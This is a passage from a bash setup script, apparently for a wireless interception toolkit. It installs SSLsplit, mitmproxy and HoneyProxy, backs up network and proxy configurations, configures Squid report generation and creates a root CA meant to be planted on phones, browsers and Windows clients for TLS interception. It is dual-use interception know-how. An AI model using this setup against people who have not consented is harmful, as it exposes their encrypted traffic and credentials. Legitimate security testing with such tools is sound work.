	eval apt-get install -y sslsplit $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Updating SSLsplit."
elif [ -f /usr/bin/sslsplit ] && [ "`dpkg -l sslsplit | grep -E "^ii" | tr -s ' ' | cut -d' ' -f3 | cut -c1-5`" != "0.4.6" ] && [ "$OS" = "KALI_linux" ];then
	$cecho "[ "$GREEN"found"$END" ] SSLsplit version `dpkg -l sslsplit | grep -E "^ii" | tr -s ' ' | cut -d' ' -f3 | cut -c1-5`: Transparent and scalable SSL/TLS interception"
elif [ -f /usr/local/bin/sslsplit ] && [ "$OS" = "BackTrack_5R3" ];then 
	$cecho "[ "$GREEN"found"$END" ] SSLsplit: Transparent and scalable SSL/TLS interception."
elif [ ! -f /usr/local/bin/sslsplit ] && [ "$OS" = "BackTrack_5R3" ];then 
	# Taken from https://cryto.org/sslsplit-unter-kali-linux-einrichten/	
	$necho "[....] Installing SSLsplit."
	eval git clone https://github.com/libevent/libevent.git /tmp/libevent/ $no_out
	eval git clone https://github.com/droe/sslsplit.git /opt/sslsplit/ $no_out
	cd /tmp/libevent/
	eval ./autogen.sh #no_out
	eval ./configure --prefix /opt/libevent2/ $no_out
	eval make $no_out 
	eval make install $no_out
	echo /opt/libevent2/"lib" > /etc/ld.so.conf.d/libevent2.conf
	eval ldconfig 
	sed -i '101i\LIBEVENT_BASE:= '/opt/libevent2/ /opt/sslsplit/"GNUmakefile"
	cd /opt/sslsplit/
	eval make $no_out
	eval make install $no_out
	if [ -d "/tmp/libevent" ]; then
	rm -r /tmp/libevent
	fi 
	$cecho "\r[ "$GREEN"ok"$END" ] Installing SSLsplit."
else
	# So, we are running KALI and SSLsplit isn't installed
	$cecho "[ "$RED"not found"$END" ] Sslsplit: Transparent and scalable SSL/TLS interception."
	$necho "[....] Installing SSLsplit."
	eval apt-get install -y sslsplit $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing SSLsplit: Transparent and scalable SSL/TLS interception."
fi

# Download and install mitmproxy only if it isn't installed
if [ -f /usr/bin/mitmproxy ];then
	$cecho "[ "$GREEN"found"$END" ] Mitmproxy: SSL-capable man-in-the-middle HTTP proxy."
else
	$necho "[....] Installing Mitmproxy: SSL-capable man-in-the-middle HTTP proxy."
	eval apt-get install -y mitmproxy $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing Mitmproxy."
fi

# Download Honey Proxy only if it isn't installed
if [ -d $HOME_DIR/.honeyproxy_prog ] && [ -f $HOME_DIR/.honeyproxy_prog/honeyproxy.py ];then
	$cecho "[ "$GREEN"found"$END" ] HoneyProxy: HTTP(S) Traffic investigation and analysis."
else
	$necho "[....] Installing HoneyProxy: HTTP(S) Traffic investigation and analysis."
	rm -r -f $HOME_DIR/.honeyproxy_prog
	mkdir $HOME_DIR/.honeyproxy_prog
	eval apt-get install -y python-pip $no_out
	eval pip install Autobahn==0.6.5 $no_out
	wget -q http://honeyproxy.org/download/honeyproxy-latest.zip -O $HOME_DIR/honeyproxy-latest.zip
	unzip -qq $HOME_DIR/honeyproxy-latest.zip -d $HOME_DIR/.honeyproxy_prog/
	rm -r $HOME_DIR/honeyproxy-latest.zip
	$cecho "\r[ "$GREEN"ok"$END" ] Installing HoneyProxy."
fi

# Check if Airchat v2.1a is present in dependencies folder.
if [ -f $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 ];then
	$cecho "[ "$GREEN"found"$END" ] Installation package Airchat v2.1a: Wireless Fun."			
else
	$cecho "[ "$RED"not found"$END" ] Installation package Airchat v2.1a: Wireless Fun."			
fi

# Check if installation packages Squid3-i386 and Squid3-amd64 v.3.3.8 with SSL support are present in dependencies folder.
if [ -d $DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_i386 ] && [ -d $DEPEND_DIR/dependencies/squid3_3.3.8/squid3_3.3.8-1.1Kali1_amd64 ];then
	$cecho "[ "$GREEN"found"$END" ] Installation packages Squid3-(i386-amd64) v.3.3.8 with SSL support."
else
	$cecho "[ "$RED"not found"$END" ] Installation packages Squid3-(i386-amd64) v.3.3.8 with SSL support."
fi

#################################################################################################################
# 	Backup (System's iptables, sarg.conf, squid.conf, proxychains.conf, proxyresolv apache2.conf)		#
# 	Backup (/var/www/ folder, udhcpd.conf, torrc, i2ptunnel.config, i2prouter and /etc/network/interfaces)	#
#################################################################################################################
if [ ! -f $HOME_DIR/backup/iptables.original ] || [ ! -f $HOME_DIR/backup/sarg.conf ] || [ ! -f $HOME_DIR/backup/squid.conf ] || [ ! -f $HOME_DIR/backup/proxychains.conf ] || [ ! -f $HOME_DIR/backup/proxyresolv ] || [ ! -f $HOME_DIR/backup/apache2.conf ] || [ ! -d $HOME_DIR/backup/www ] || [ ! -f $HOME_DIR/backup/udhcpd.conf ] || [ ! -f $HOME_DIR/backup/torrc ] || [ ! -f $HOME_DIR/backup/i2ptunnel.config ] || [ ! -f $HOME_DIR/backup/i2prouter ] || [ ! -f $HOME_DIR/backup/interfaces ] || [ ! -f $HOME_DIR/backup/crda ];then
	echo
	echo ""$BLUE"B a c k U p  F i l e s :"$END"" | centered_text
else
	echo
	echo ""$BLUE"B a c k U p  F i l e s :"$END"" | centered_text
	$cecho "[ "$GREEN"found"$END" ] Backup files: proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
	$cecho "          udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
echo 
fi

if [ ! -f $HOME_DIR/backup/iptables.original ];then
	echo
	$necho "[....] Making a backup copy of current IPTABLES to $HOME_DIR/backup/"
	/sbin/iptables-save > $HOME_DIR/backup/iptables.original
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of current IPTABLES to $HOME_DIR/backup/"
fi

# Make a backup copy of sarg.conf to $HOME_DIR
if [ ! -f $HOME_DIR/backup/sarg.conf ];then
	$necho "[....] Making a backup copy of Sarg's configuration file to $HOME_DIR/backup"
	cp /etc/sarg/sarg.conf $HOME_DIR/backup/sarg.conf
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Sarg's configuration file to $HOME_DIR/backup"
fi

# Make a backup copy of squid.conf to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/squid.conf ];then
	$necho "[....] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
	cp /etc/squid3/squid.conf $HOME_DIR/backup/squid.conf
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Squid3's configuration file to $HOME_DIR/backup"
fi

# Make a backup copy of proxychains.conf and proxyresolv to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/proxychains.conf ] || [ ! -f $HOME_DIR/backup/proxyresolv ];then
	$necho "[....] Making a backup copy of proxychains.conf configuration file to $HOME_DIR/backup"
	cp /etc/proxychains.conf $HOME_DIR/backup/proxychains.conf
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of proxychains.conf configuration file to $HOME_DIR/backup"
	$necho "[....] Making a backup copy of proxyresolv file to $HOME_DIR/backup"
	cp $proxyresolv_path/proxyresolv $HOME_DIR/backup/proxyresolv
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of proxyresolv file to $HOME_DIR/backup"
fi

# Make a backup copy of apache2's apache2.conf to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/apache2.conf ];then
	$necho "[....] Making a backup copy of Apache2's httpd configuration file to $HOME_DIR/backup"
	cp /etc/apache2/apache2.conf $HOME_DIR/backup/apache2.conf
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of Apache2's httpd configuration file to $HOME_DIR/backup"
fi

# Make a backup copy of /var/www/ to $HOME_DIR/backup/www/
if [ ! -d $HOME_DIR/backup/www ];then
	mkdir $HOME_DIR/backup/www
		if [ -d /var/www/ ];then
			$necho "[....] Making a backup copy of /var/www/ folder to $HOME_DIR/backup/www/"
			cp -r /var/www/* $HOME_DIR/backup/www/
			$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of /var/www/ folder to $HOME_DIR/backup/www/"
			$necho "[....] Cleaning up /var/www/ folder"
			rm -r /var/www/*
			sleep 0.5
			$cecho "\r[ "$GREEN"ok"$END" ] Cleaning up /var/www/ folder"
		fi
fi

# Make a backup copy of udhcpd.conf to $HOME_DIR/back/udhcpd
if [ ! -f $HOME_DIR/backup/udhcpd.conf ] && [ -s /etc/udhcpd.conf ];then
	$necho "[....] Making a backup copy of UDHCPD configuration file to $HOME_DIR/backup"
	cp /etc/udhcpd.conf $HOME_DIR//backup/udhcpd.conf
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of UDHCPD configuration file to $HOME_DIR/backup"
fi

# Make a backup copy of TOR's torrc configuration file to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/torrc ];then
	$necho "[....] Making a backup copy of TOR's configuration file (torrc) to $HOME_DIR/backup"
	cp /etc/tor/torrc $HOME_DIR/backup/torrc
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of TOR's configuration file (torrc) to $HOME_DIR/backup"
fi

# Make a backup copy of I2P's i2ptunnel.config  and i2prouter files to $HOME_DIR/backup before we make changes.
if [ ! -f $HOME_DIR/backup/i2ptunnel.config ];then
	$necho "[....] Making a backup copy of I2P's files (i2ptunnel.config, i2prouter) to $HOME_DIR/backup"
	cp $i2prouter_conf/i2ptunnel.config $HOME_DIR/backup/i2ptunnel.config
	cp $i2prouter_path/i2prouter $HOME_DIR/backup/i2prouter
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of I2P's files (i2ptunnel.config, i2prouter) to $HOME_DIR/backup"
fi

# Make a backup copy of /etc/network/interfaces file to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/interfaces ];then
	$necho "[....] Making a backup copy of /etc/network/interfaces to $HOME_DIR/backup"
	cp /etc/network/interfaces $HOME_DIR/backup/interfaces
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of /etc/network/interfaces to $HOME_DIR/backup"
fi

# Make a backup copy of /etc/default/crda file to $HOME_DIR/backup
if [ ! -f $HOME_DIR/backup/crda ];then
	$necho "[....] Making a backup copy of /etc/default/crda to $HOME_DIR/backup"
	cp /etc/default/crda $HOME_DIR/backup/crda
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Making a backup copy of /etc/default/crda to $HOME_DIR/backup"
fi

# So, if $ATH_PROMPT is set to "yes" (from aerial.conf) and we are running Kali (kali doesn't have any ath_pci modules disabled by default).
# let's blacklist them in case we want to install them in the future, which is NOT RECOMMENDED AT ALL.
if [ ! -f /etc/modprobe.d/blacklist-ath_pci.conf ] && [ "$ATH_PROMPT" = "yes" ];then
	$necho "[....] Blacklisting Madwifi-ng drivers. (in case we want to install them in the future)."
	touch /etc/modprobe.d/blacklist-ath_pci.conf
	echo "blacklist ath_pci" >> /etc/modprobe.d/blacklist-ath_pci.conf
	echo "blacklist ath_pci" >> /etc/modprobe.d/kali-blacklist.conf
	sleep 0.5
	$cecho "\r[ "$GREEN"ok"$END" ] Blacklisting Madwifi-ng drivers. (in case we want to install them in the future)."
fi


#################################################################################################################
#					Let's configure SARG							#
#			Reconfigure sarg.conf if SARG_RECONF is set to yes					#
#		Real time reports: http://www.safesquid.com/html/viewtopic.php?t=2398				#
#################################################################################################################
SARG_HEAD(){ 
	clear
	$cecho ""$BLUE"C u s t o m i z i n g  S a r g"$END"" | centered_text
	echo
	$cecho ""$BLUE"Squid Analysis Report Generator"$END"" | centered_text
	echo
	echo
}

if [ "$SARG_RECONF" = "yes" ] && [ -f $HOME_DIR/backup/sarg.conf ];then
	export YN=3
	SARG_HEAD
	echo "You are able to make changes to Sarg configuration file"
	echo "Would you like to:"
	echo
	echo "1. Customize Sarg"
	echo "2. Continue"
	echo
	$cecho ""$RED"WARNING : If this is YOUR FIRST TIME you are running this script"
	echo "you MUST answer ( 1 ) "$END""
	echo
	$necho "Please enter your choice (1 - 2): "
		while [ "$YN" = "3" ];do
			read YN
				if [ "$YN" = "1" ] || [ "$YN" = "2" ];then
					if [ "$YN" = "1" ];then
						export YN=1
					else
						if [ "$YN" = "2" ] && [ -f $HOME_DIR/backup/sarg.conf ] && [ -n "`grep 'access_log /var/log/squid/access.log' /etc/sarg/sarg.conf`" ];then
							export YN="1"
							clear
							$cecho ""$RED"Sarg (Squid Analysis Report Generator) not customized yet."$END""
							echo
							read -p 'Press ENTER to customize...' string;echo
							clear
						else
							if [ "$YN" = "2" ];then
								export YN=2
							fi
						fi
					fi
				else
					YN=3
					SARG_HEAD
					echo "You are able to make changes to Sarg configuration file"
					echo "Would you like to:"
					echo
					echo "1. Customize Sarg"
					echo "2. Continue"
					echo
					$cecho ""$RED"WARNING : If this is YOUR FIRST TIME you are running this script"
					echo "you MUST answer ( 1 ) "
					echo 
					echo "! ! ! Wrong input ! ! !"$END""
					$necho "Please enter your choice (1 - 2): "
				fi
		done
fi
#################################################################################################################
#				Configure sarg.conf if not configured yet					#
#################################################################################################################
if [ "$SARG_RECONF" = "no" ] && [ -f $HOME_DIR/backup/sarg.conf ] && [ -n "`grep 'access_log /var/log/squid/access.log' /etc/sarg/sarg.conf`" ];then
	export YN=1
	echo
	$cecho ""$RED"Sarg (Squid Analysis Report Generator) not customized yet."$END""
	read -p 'Press ENTER to customize...' string;echo
	clear
else
	export YN=2
fi


if [ "$YN" = "1" ] || [ "$YN" = "2" ];then
	if [ "$YN" = "1" ];then
		cp -r $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
		while :
		do
			SARG_HEAD
			echo "Available languages for Sarg:"
			echo
			echo "Bulgarian_windows1251  # Catalan"
			echo "Czech                  # Dutch"
			echo "English                # French"
			echo "German                 # Greek"
			echo "Hungarian              # Indonesian"
			echo "Italian                # Japanese"
			echo "Latvian                # Polish"
			echo "Portuguese             # Romanian"
			echo "Russian_koi8           # Russian_UFT-8"
			echo "Russian_windows1251    # Serbian"
			echo "Slovak                 # Spanish"
			echo "Turkish                #"
			echo
			$necho "Enter the language you want to use in Sarg [e.g. "$GREEN"English"$END" ] :"
			read LANGGE
				case $LANGGE in
					Bulgarian_windows1251|Catalan|Czech|Dutch|English|French|German|Greek|Hungarian|Indonesian|Italian|Japanese|Latvian|Polish|Portuguese|Romanian|Russian_koi8|Russian_UFT-8|Russian_windows1251|Serbian|Slovak|Spanish|Turkish)
						sed 's%language English%language '$LANGGE'%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
						break
					;;
					"")
						echo
						$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
						read -p 'Press ENTER to continue...' string;echo
					;;
					*) 
						echo
						$cecho "! ! ! "$RED""$LANGGE""$END" is an invalid option ! ! !"
						$cecho "( Case Sensitive Input. e.g."$GREEN"English"$END" not "$RED"english"$END") :"
						read -p 'Press ENTER to continue...' string;echo
					;;
				esac
		done

		while :
		do
		SARG_HEAD
		echo "Date format in reports."
		echo
		echo "e=(European=dd/mm/yy), u=(American=mm/dd/yy), w=(Weekly=yy.ww)"
		echo
		$necho "Enter date format [e.g."$GREEN"e"$END" ]? "
		read DATE
			case $DATE in
				e|u|w)
					sed 's%date_format u%date_format '$DATE'%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
					break
				;;
				"")
					echo
					$cecho "! ! ! "$RED"BLANK"$END" is an invalid optionn ! ! !"
					read -p 'Press ENTER to continue...' string
				;;
				*)
					echo
					$cecho "! ! ! "$RED""$DATE""$END" is an invalid optionn ! ! !"
					$cecho "( Case Sensitive Input. e.g."$GREEN"u"$END" not "$RED"U"$END")"
					read -p 'Press ENTER to continue...' string;echo
				;;
			esac
		done
echo
		while :
		do
			SARG_HEAD
			echo "Long URL in report."
			echo
			echo "If yes, the full URL is showed in report."
			echo "If no, only the site will be showed"
			echo
			echo "! ! ! YES option generate very big sort files and reports. ! ! !"
			echo
			$necho "Long URLs [ "$GREEN"yes"$END" or "$GREEN"no"$END" ] :"
			read LONG
				case $LONG in
					[yY] | [yY][Ee][Ss] )
						sed 's%long_url no%long_url yes%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
						break
					;;
					[nN] | [nN][Oo] )
						break
					;;
					"") 
						echo
						$cecho "! ! ! "$RED"BLANK"$END" is an invalid optionn ! ! !"
						read -p 'Press ENTER to continue...' string
					;;
					*)
						echo
						$cecho "! ! ! "$RED""$LONG""$END" is an invalid optionn ! ! !"
						$cecho "( Not case sensitive Input. e.g."$GREEN"no"$END" or "$RED"No"$END") :"
						read -p 'Press ENTER to continue...' string;echo
					;;
				esac
		done
		sed 's%font_size 9px%font_size 11px%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#header_font_size 9px%header_font_size 13px%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#header_font_size 11px%header_font_size 13px%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#title_font_size 11px%title_font_size 15px%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%# realtime_refresh_time 3%realtime_refresh_time 4%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%# realtime_access_log_lines 1000%realtime_access_log_lines 1000%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%# realtime_types GET,PUT,CONNECT%realtime_types GET,PUT,CONNECT,ICP_QUERY,POST%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#www_document_root /var/www/html%www_document_root /var/www/sarg-realtime%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		# Testing resolve_ip 
		sed 's%resolve_ip%resolve_ip yes%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%access_log /var/log/squid/access.log%access_log /var/log/squid3/access.log%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#graphs yes%graphs yes%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%#graph_days_bytes_bar_color orange%graph_days_bytes_bar_color orange%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sed 's%output_dir /var/lib/sarg%output_dir '"$HOME_DIR"'/squid-reports%g' /etc/sarg/sarg.conf > /etc/sarg/sarg1.conf && mv /etc/sarg/sarg1.conf /etc/sarg/sarg.conf
		sleep 1
	fi
		if [ "$YN" = "2" ] && [ -n "`grep 'access_log /var/log/squid/access.log' /etc/sarg/sarg.conf`" ];then
			$cecho ""$RED"Sarg is not modified yet. Please run this script again and when asked to customize, answer (1). - Stop"$END""
			cp -r $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
			exit 1
		fi
		if [ -n "`grep 'access_log /var/log/squid3/access.log' /etc/sarg/sarg.conf`" ]; then
			echo
			echo ""$BLUE"C u s t o m i z e d  F i l e s :"$END"" | centered_text
			$cecho "[ "$GREEN"customized"$END" ] Sarg's configuration file: sarg.conf."
		fi
fi

#################################################################################################################
# 		Finally let's modify apache2's configuration file to run in localhost.				#
# 			Modify apache2's apache2.conf "ServerName localhost"					#
# 				Using 127.0.1.1 for ServerName							#
#################################################################################################################
if [ -z "`grep 'localhost' /etc/apache2/apache2.conf | awk '{print $2}'`" ]; then
	echo
	$necho "[....] Modifying apache2's apache2.conf to run on localhost."
	echo "ServerName localhost" >> /etc/apache2/apache2.conf
	$cecho "\r[ "$GREEN"ok"$END" ] Modifying apache2's apache2.conf to run on localhost."
	sleep 2
else
	$cecho "[ "$GREEN"customized"$END" ] Apache2's configuration file: apache2.conf"
fi

#################################################################################################################
# 					Trust Anchor Certificates (root CA).					#
#														#
#		They will be used for SSLsplit, mitmproxy, honeyproxy,Squid in the Middle and			#
# 		for various flavors of clients: IOS,IOS Simulator,Firefox,Java,OSX,*nix systems,		#
#		Windows platforms and Android 4.x devices.							#
#														#
# Trust Anchor Certificates will be stored to $HOME_DIR/CA-certificates/ and $HOME_DIR/backup/CA-certificates/	#
#														#
# http://www.debian-administration.org/articles/618								#
# http://www.unrest.ca/working-with-ssl-certificates								#
# http://code.rogerhub.com/infrastructure/474/signing-your-own-wildcard-sslhttps-certificates/			#
# http://www.secureworks.com/cyber-threat-intelligence/threats/transitive-trust/				#
# http://www.mail-archive.com/cryptography@randombit.net/msg01782.html						#
# http://wiki.cacert.org/FAQ/ImportRootCert									#
# http://wiki.cacert.org/FAQ/ImportRootCertAndroidPreICS							#
#################################################################################################################
if [ ! -d $HOME_DIR/CA-certificates/ ];then
	mkdir $HOME_DIR/CA-certificates/
fi

# Restoring from $HOME_DIR/backup/CA-certificates/ if for some reason was deleted by user.
if [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.key ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.crt ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.pem ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 ] || [ ! -f $HOME_DIR/CA-certificates/README ];then
	if [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca.key ] && [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca.crt ] && [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca.pem ] && [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.crt ] && [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.pem ] && [ -f $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.p12 ] && [ -f $HOME_DIR/backup/CA-certificates/README ];then
		clear
		$cecho ""$BLUE"T r u s t  A n c h o r  C e r t i f i c a t e s  ( r o o t  C A ):"$END"" | centered_text
		echo
		echo
		$cecho ""$RED"CA certificates could not been found in $HOME_DIR/CA-certificates/ for some reason."$END""
		$cecho "Restoring from: $HOME_DIR/backup/CA-certificates/"
		$necho "[....] Restoring $friendly_name-ca.key"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca.key $HOME_DIR/CA-certificates/$friendly_name-ca.key
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca.key"
		$necho "[....] Restoring $friendly_name-ca.crt"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca.crt $HOME_DIR/CA-certificates/$friendly_name-ca.crt
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca.crt"
		$necho "[....] Restoring $friendly_name-ca.pem"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca.pem $HOME_DIR/CA-certificates/$friendly_name-ca.pem
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca.pem"
		$necho "[....] Restoring $friendly_name-ca-cert.pem"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.pem $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca-cert.pem"
		$necho "[....] Restoring $friendly_name-ca-cert.p12"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.p12 $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca-cert.p12"
		$necho "[....] Restoring $friendly_name-ca-cert.crt"
		cp $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.crt $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring $friendly_name-ca-cert.crt"
		$necho "[....] Restoring README"
		cp $HOME_DIR/backup/CA-certificates/README $HOME_DIR/CA-certificates/README
		$cecho "\r[ "$GREEN"ok"$END" ] Restoring README"
		read -p 'Press ENTER to continue...' string;echo

	fi
fi

# Let's create our certificates for SSLsplt, MiTMproxy, HoneyProxy and Squid in The Middle if they doesn't exist.
if [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.key ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.crt ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca.pem ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 ] || [ ! -f $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt ] || [ ! -f $HOME_DIR/CA-certificates/README ];then
	clear
	$cecho ""$BLUE"T r u s t  A n c h o r  C e r t i f i c a t e s  ( r o o t  C A ):"$END"" | centered_text
	echo
	echo
	$necho "[....] Creating configuration file x509v3ca.cnf"

cat > $HOME_DIR/CA-certificates/x509v3ca.cnf << EOF
[ req ]
default_bits            = 4096
default_md              = sha1
default_keyfile         = $friendly_name-ca.key
distinguished_name      = req_distinguished_name
x509_extensions         = v3_ca
string_mask             = nombstr

[ req_distinguished_name ]

[ v3_ca ]
basicConstraints        = critical,CA:true
nsCertType  		= critical,sslCA
extendedKeyUsage  	= critical,serverAuth,clientAuth,emailProtection,timeStamping,msCodeInd,msCodeCom,msCTLSign,msSGC,msEFS,nsSGC
keyUsage  		= keyCertSign,cRLSign
subjectKeyIdentifier    = hash
EOF
	$cecho "\r[ "$GREEN"ok"$END" ] Creating configuration file x509v3ca.cnf"
	
	$necho "[....] Generating RSA CA private key $friendly_name-ca.key, 4096bit long. Please wait..."
	eval openssl genrsa -out $HOME_DIR/CA-certificates/$friendly_name-ca.key 4096 $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Generating RSA CA private key $friendly_name-ca.key, 4096bit long.                 "
	
	# You can check it with: openssl x509 -purpose -in Aerial-ca.pem -inform PEM
	$necho "[....] Creating CA certificate $friendly_name-ca.crt for Proxies: Squid in The Middle and SSLsplit"
	openssl req -new -nodes -x509 -sha1 -out $HOME_DIR/CA-certificates/$friendly_name-ca.crt -key $HOME_DIR/CA-certificates/$friendly_name-ca.key -config $HOME_DIR/CA-certificates/x509v3ca.cnf -extensions v3_ca -subj '/O=Nick_the_Greek/OU=Nick_the_Greek Aerial RootCA 2014/CN=Nick_the_Greek '$friendly_name'/' -days 9999
	$cecho "\r[ "$GREEN"ok"$END" ] Creating CA certificate $friendly_name-ca.crt for Proxies: Squid in The Middle and SSLsplit"

	$necho "[....] Creating CA certificate $friendly_name-ca.pem for Proxies: Mitmproxy and HoneyProxy"
	cat $HOME_DIR/CA-certificates/$friendly_name-ca.key $HOME_DIR/CA-certificates/$friendly_name-ca.crt > $HOME_DIR/CA-certificates/$friendly_name-ca.pem
	$cecho "\r[ "$GREEN"ok"$END" ] Creating CA certificate $friendly_name-ca.pem for Proxies: Mitmproxy and HoneyProxy"
	
	#The certificate in PEM format. Use this to distribute to most non-Windows platforms.
	$necho "[....] Creating CA certificate $friendly_name-ca-cert.pem for Clients: IOS,IOS Simulator,Firefox,Java,OSX,*nix systems."
	openssl x509 -in $HOME_DIR/CA-certificates/$friendly_name-ca.crt -out $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem -outform PEM
	$cecho "\r[ "$GREEN"ok"$END" ] Creating CA certificate $friendly_name-ca-cert.pem for Clients: IOS,IOS Simulator,Firefox,Java,OSX,*nix systems."
	
	# pem to pkcs12
	$necho "[....] Creating CA certificate $friendly_name-ca-cert.p12 for Clients: Windows platforms."
	openssl pkcs12 -export -in $HOME_DIR/CA-certificates/$friendly_name-ca.crt -inkey $HOME_DIR/CA-certificates/$friendly_name-ca.key -out $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 -name "$friendly_name" -password pass:
	$cecho "\r[ "$GREEN"ok"$END" ] Creating CA certificate $friendly_name-ca-cert.p12 for Clients: Windows platforms."

	# If CA cert has not x509v3 extensions, an Android device will treat it as a user cert and NOT a CA cert.
	# check it with: openssl x509 -noout -text -in $friendly_name-ca.crt
	# And it must be in binary format, not in plait text.
	$necho "[....] Creating CA certificate $friendly_name-ca-cert.crt in binary format for Clients: Android devices."
	openssl x509 -inform PEM -outform DER -in $HOME_DIR/CA-certificates/$friendly_name-ca.pem -out $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt
	$cecho "\r[ "$GREEN"ok"$END" ] Creating CA certificate $friendly_name-ca-cert.crt in binary format for Clients: Android devices."

# Let's make a README file in $HOME_DIR/CA-certificates/ with explanations
cat > $HOME_DIR/CA-certificates/README << EOF
     File:                       Explanation:                                          Needed for:
$friendly_name-ca.key        CA private key.                                       Proxies : Squid in the Middle, SSLsplit.
$friendly_name-ca.crt        CA certificate.                                       Proxies : Squid in the Middle, SSLsplit.
